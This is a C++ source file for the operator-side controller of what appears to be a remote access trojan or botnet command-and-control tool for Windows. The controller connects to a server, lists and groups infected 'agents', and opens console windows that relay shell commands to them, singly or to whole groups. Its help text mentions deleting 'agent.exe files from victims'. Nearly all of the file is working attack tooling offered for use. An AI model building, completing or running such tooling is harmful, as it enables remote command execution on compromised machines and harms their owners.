#include "Controller.hpp"


Controller::Controller(const std::string& szIp, INT iPort) {
    szServerIp = szIp;
    iServerPort = iPort;
    bIsRunning = TRUE;
    sock = INVALID_SOCKET;
}


Controller::~Controller() {
    if (sock != INVALID_SOCKET) {
        closesocket(sock);
    }

    WSACleanup();
}


BOOL Controller::Connect()
{
    WSADATA wsaData;
    sockaddr_in serverAddr{};

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";

        return FALSE;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";

        return FALSE;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(iServerPort);

    if (inet_pton(AF_INET, szServerIp.c_str(), &serverAddr.sin_addr) != 1) {
        std::cerr << "Invalid IP address\n";

        return FALSE;
    }

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connection to server failed\n";

        return FALSE;
    }

    std::cout << "[+] Connected to " << szServerIp << ":" << iServerPort << "\n";
    return TRUE;
}

VOID Controller::Run()
{
    while (bIsRunning) {
        ControllerCommandReq commandReq = ValidateUserInput();
        HandleCommandObject(commandReq);
    }
}

ControllerCommandReq Controller::ValidateUserInput()
{
    CommandType commandType;
    std::wstring wszCurrentParam;
    std::wstring wszInput;
    std::wstring wszCommand;
    ControllerCommandReq commandReq;
    std::vector<std::wstring> wszArrParameters;

    while (TRUE) {

        std::wcout << L"CMD> ";
        std::getline(std::wcin, wszInput);

        std::wistringstream iss(wszInput);
        iss >> wszCommand;

        while (iss >> wszCurrentParam) {
            wszArrParameters.push_back(wszCurrentParam);
        }

        commandType = StringToCommandType(wszCommand);

        switch (commandType) {
        case CommandType::Quit:
            return ControllerCommandReq(CommandType::Quit, L"", L"", L"");

        case CommandType::Close:
            if (wszArrParameters.size() != 1) {
                std::cout << "[!] Invalid parameters for close command\n";
                break;
            }
            else {
                return ControllerCommandReq(CommandType::Close, wszArrParameters[0], L"", L"");
            }

        case CommandType::GroupCreate:
            if (wszArrParameters.size() == 1) {
                return ControllerCommandReq(CommandType::GroupCreate, L"", wszArrParameters[0], L"");
            }
            else {
                std::cout << "[!] Invalid parameters for group-create command\n";
                break;
            }
            

        case CommandType::GroupDelete:
            if (wszArrParameters.size() == 1) {
                return ControllerCommandReq(CommandType::GroupDelete, L"", wszArrParameters[0], L"");
            }
            else {
                std::cout << "[!] Invalid parameters for group-delete command\n";
                break;
            }

        case CommandType::GroupAdd:
            if (wszArrParameters.size() == 2) {
                return ControllerCommandReq(CommandType::GroupAdd, wszArrParameters[1], wszArrParameters[0], L"");
            }
            else {
                std::cout << "[!] Invalid parameters for group-add command\n";
                break;
            }

        case CommandType::GroupRemove:
            if (wszArrParameters.size() == 2) {
                return ControllerCommandReq(CommandType::GroupRemove, wszArrParameters[1], wszArrParameters[0], L"");
            }
            else {
                std::cout << "[!] Invalid parameters for group-remove command\n";
                break;
            }

        case CommandType::ListGroup:
            if (wszArrParameters.size() == 1) {
                return ControllerCommandReq(CommandType::ListGroup, L"", wszArrParameters[0], L"");
            }
            else {
                std::cout << "[!] Invalid parameters for group-list command\n";
                break;
            }

        case CommandType::ListGroupNames:
            return ControllerCommandReq(CommandType::ListGroupNames, L"", L"", L"");

        case CommandType::List:
            return ControllerCommandReq(CommandType::List, L"", L"", L"");

        case CommandType::Execute:
            if (wszArrParameters.size() != 1) {
                std::cout << "[!] Invalid parameters for cmd command\n";
                break;
            }
            else {
                return ControllerCommandReq(CommandType::OpenCmdWindow, wszArrParameters[0], L"", L"");
            }

        case CommandType::GroupExecute:
            if (wszArrParameters.size() != 1) {
                std::cout << "[!] Invalid parameters for group-cmd command\n";
                break;
            }
            else {
                return ControllerCommandReq(CommandType::OpenCmdWindow, L"", wszArrParameters[0], L"");
            }

        case CommandType::Man:
            return ControllerCommandReq(CommandType::Man, L"", L"", L"");

        case CommandType::NewLine:
            break;

        default:
            std::cout << "[!] Unrecognized command\n";
            break;
        }
    }
}


VOID Controller::HandleCommandObject(ControllerCommandReq commandReq)
{
    std::wstring wszOutputBuffer;
    CommandType commandType = commandReq.GetCommandType();

    if (commandType == CommandType::Close || commandType == CommandType::List || commandType == CommandType::GroupAdd ||
        commandType == CommandType::GroupRemove || commandType == CommandType::GroupCreate || commandType == CommandType::GroupDelete ||
        commandType == CommandType::ListGroup || commandType == CommandType::ListGroupNames || commandType == CommandType::Quit) 
    {
        SendCommand(commandReq);
        ReceiveData(wszOutputBuffer);
        std::wcout << wszOutputBuffer;
    }

    if (commandType == CommandType::Unknown || commandType == CommandType::Man) {
        ShowMan();
    }

    if (commandType == CommandType::OpenCmdWindow) {
        SendCommand(commandReq);
        ReceiveData(wszOutputBuffer);
        if (wszOutputBuffer != L"Found") {
            std::wcout << L"[!] Could not find " << commandReq.GetTargetAgent() << commandReq.GetGroupName() << L"\n";
        }
        else {
            arrWindowSessionThreads.emplace_back(&Controller::OpenSessionWindow, this, commandReq);
        }
    }
}

BOOL Controller::SendCommand(ControllerCommandReq commandReq)
{
    INT iBytesSent;
    nlohmann::json j = commandReq;
    std::string szTempJson;
    std::wstring wszCommand;

    if (sock == INVALID_SOCKET) {
        return FALSE;
    }
    szTempJson = j.dump(VERBOSE_JSON);
    wszCommand = StringToWstring(szTempJson);
    iBytesSent = send(sock, reinterpret_cast<const CHAR*>(wszCommand.c_str()), static_cast<int>(wszCommand.size() * sizeof(WCHAR)), 0);

    return iBytesSent == wszCommand.size() * sizeof(WCHAR);
}

BOOL Controller::ReceiveData(std::wstring& wszOutBuffer) {

    INT iBytesReceived;
    WCHAR wcarrBuffer[MAX_BUFFER_SIZE];

    if (sock == INVALID_SOCKET) {
        return FALSE;
    }

    uint32_t uiNetMessageLen;
    uint32_t uiHostMessageLen;
    iBytesReceived = recv(sock, (LPSTR)&uiNetMessageLen, sizeof(uiNetMessageLen), 0);

    if (iBytesReceived > 0) {
        wszOutBuffer.clear();
        uiHostMessageLen = ntohl(uiNetMessageLen);
        INT iTotalBytesReceived = 0;

        if (uiHostMessageLen > MAX_MSG_SIZE) {
            return FALSE;
        }

        while (iTotalBytesReceived < uiHostMessageLen) {
            iBytesReceived = recv(sock, reinterpret_cast<CHAR*>(wcarrBuffer), sizeof(wcarrBuffer) - sizeof(WCHAR), 0);
            wcarrBuffer[iBytesReceived / sizeof(WCHAR)] = '\0';
            wszOutBuffer += wcarrBuffer;
            iTotalBytesReceived += iBytesReceived;
        }

        return TRUE;
    }

    return FALSE;
}

VOID Controller::OpenSessionWindow(ControllerCommandReq commandReq)
{
    BOOL bIsGroupSession;
    BOOL bIsChildCreated;
    WCHAR wcarrSelfPath[MAX_PATH];
    HANDLE hChildStdoutRead;
    HANDLE hChildStdoutWrite;
    HANDLE hChildStdinRead;
    HANDLE hChildStdinWrite;
    CommandType commandType;
    std::wstring wszWindowName;
    std::wstring wszWindowCommand;
    std::wstring wszCommandOutput;
    std::wstring wszProcessCommandLine;
    STARTUPINFOW siStartInfo{};
    SECURITY_ATTRIBUTES saAttr{};
    PROCESS_INFORMATION piProcInfo{};
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION jobInfo = {};

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    CreatePipe(&hChildStdoutRead, &hChildStdoutWrite, &saAttr, 0);
    SetHandleInformation(hChildStdoutRead, HANDLE_FLAG_INHERIT, 0);

    CreatePipe(&hChildStdinRead, &hChildStdinWrite, &saAttr, 0);
    SetHandleInformation(hChildStdinWrite, HANDLE_FLAG_INHERIT, 0);

    siStartInfo.cb = sizeof(STARTUPINFOA);
    siStartInfo.hStdError = hChildStdoutWrite;
    siStartInfo.hStdOutput = hChildStdoutWrite;
    siStartInfo.hStdInput = hChildStdinRead;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    if (commandReq.GetGroupName().empty()) {
        wszWindowName = commandReq.GetTargetAgent();
        commandType = CommandType::Execute;
        bIsGroupSession = FALSE;
    }
    else {
        wszWindowName = commandReq.GetGroupName();
        commandType = CommandType::GroupExecute;
        bIsGroupSession = TRUE;
    }

    GetModuleFileNameW(NULL, wcarrSelfPath, MAX_PATH);
    wszProcessCommandLine = std::wstring(wcarrSelfPath) + L" " + wszWindowName;
    bIsChildCreated = CreateProcessW(
        NULL,
        &wszProcessCommandLine[0],
        NULL,
        NULL,
        TRUE,
        CREATE_NEW_CONSOLE | CREATE_SUSPENDED,
        NULL,
        NULL,
        &siStartInfo,
        &piProcInfo
    );

    if (!bIsChildCreated) {
        std::cerr << "Failed to start session window.\n";
        exit(1);
    }

    hJobHandle = CreateJobObject(NULL, NULL);
    jobInfo.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    SetInformationJobObject(hJobHandle, JobObjectExtendedLimitInformation, &jobInfo, sizeof(jobInfo));
    AssignProcessToJobObject(hJobHandle, piProcInfo.hProcess);
    ResumeThread(piProcInfo.hThread);

    CloseHandle(hChildStdoutWrite);
    CloseHandle(hChildStdinRead);

    // Get initial CWD
    SendCommand(ControllerCommandReq(commandType, commandReq.GetTargetAgent(), commandReq.GetGroupName(), L""));
    ReceiveData(wszCommandOutput);
    WriteToChild(hChildStdinWrite, wszCommandOutput);

    while (bIsRunning) {
        if (!ReadFromChild(hChildStdoutRead, wszWindowCommand)) {
            break;
        }

        SendCommand(ControllerCommandReq(commandType, commandReq.GetTargetAgent(), commandReq.GetGroupName(), wszWindowCommand));
        ReceiveData(wszCommandOutput);

        if (!WriteToChild(hChildStdinWrite, wszCommandOutput)) {
            break;
        }
    }
}

BOOL Controller::ReadFromChild(HANDLE hChildStdoutRead, std::wstring& wszOutCommand)
{
    BOOL bIsReadSuccess;
    WCHAR wcarrReadBuffer[MAX_BUFFER_SIZE];
    DWORD dwBytesRead;
    bIsReadSuccess = ReadFile(hChildStdoutRead, wcarrReadBuffer, sizeof(wcarrReadBuffer) - sizeof(WCHAR), &dwBytesRead, NULL);

    if (bIsReadSuccess) {
        wcarrReadBuffer[dwBytesRead / sizeof(WCHAR)] = '\0';
        wszOutCommand = std::wstring(wcarrReadBuffer);
    }

    return bIsReadSuccess;
}

BOOL Controller::WriteToChild(HANDLE hChildStdinWrite, const std::wstring& wszData)
{
    BOOL bIsWriteSuccess;
    DWORD dwBytesWritten;
    bIsWriteSuccess = WriteFile(hChildStdinWrite, wszData.c_str(), wszData.length() * sizeof(WCHAR),
        &dwBytesWritten, NULL) || dwBytesWritten != wszData.length() * sizeof(WCHAR);

    return bIsWriteSuccess;
}


VOID Controller::ShowMan()
{
    std::cout << "[*] AGENT - Can be used as IP:PORT pair or HOSTNAME:SESSION pair.\n";
    std::cout << "[*] quit - Kill server and all connections, delete agent.exe files from victims.\n";
    std::cout << "[*] close AGENT - Close connection.\n";
    std::cout << "[*] cmd AGENT - Start a cmd session with AGENT.\n";
    std::cout << "[*] list - Show all active connections.\n";
    std::cout << "[*] group-create - Create a new empty control group.\n";
    std::cout << "[*] group-delete GROUPNAME - Delete GROUPNAME control group.\n";
    std::cout << "[*] group-add GROUPNAME AGENT - Add AGENT to GROUPNAME control group.\n";
    std::cout << "[*] group-remove GROUPNAME AGENT - Remove AGENT from GROUPNAME control group.\n";
    std::cout << "[*] group-list GROUPNAME - Print the members of GROUPNAME control group.\n";
    std::cout << "[*] group-cmd GROUPNAME - Start a cmd session with GROUPNAME control group.\n";
    std::cout << "[*] groups - Print all active control groups.\n";
    std::cout << "[*] man - Show this man page.\n";
}


CommandType Controller::StringToCommandType(const std::wstring& wszInput) {
    auto it = StringToCommandTypeMap.find(wszInput);
    if (it != StringToCommandTypeMap.end()) {
        return it->second;
    }
    return CommandType::Unknown;
}